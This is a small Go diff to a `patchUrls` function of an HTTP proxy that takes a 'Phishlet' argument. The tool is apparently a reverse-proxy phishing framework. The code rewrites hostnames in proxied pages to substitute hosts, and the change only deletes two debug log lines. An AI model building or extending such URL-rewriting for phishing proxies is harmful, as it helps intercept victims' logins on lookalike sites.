@@ -1524,10 +1524,8 @@ func (p *HttpProxy) patchUrls(pl *Phishlet, body []byte, c_type int) []byte {
 
 		
 		body = []byte(re_url.ReplaceAllStringFunc(string(body), func(s_url string) string {
-			log.Info("URL: %s", s_url)
 			u, err := url.Parse(s_url)
 			if err == nil {
-				log.Info("URL: %s", u.Host)
 				for _, h := range hosts {
 					if strings.ToLower(u.Host) == h {
 						s_url = strings.Replace(s_url, u.Host, sub_map[h], 1)
